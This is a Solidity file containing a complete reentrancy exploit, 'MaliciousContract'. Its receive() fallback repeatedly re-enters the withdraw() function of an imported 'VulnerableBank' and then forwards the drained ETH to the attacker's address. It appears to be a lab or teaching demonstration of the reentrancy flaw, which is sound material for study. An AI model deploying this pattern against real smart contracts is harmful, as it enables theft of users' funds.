// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract MaliciousContract {
    VulnerableBank public target;
    address public owner;

    constructor(address _targetAddress) {
        target = VulnerableBank(_targetAddress);
        owner = msg.sender;
    }

    // This function is called when ETH is received
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw(1 ether);
    }

    function withdrawFunds() public {
        payable(owner).transfer(address(this).balance);
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
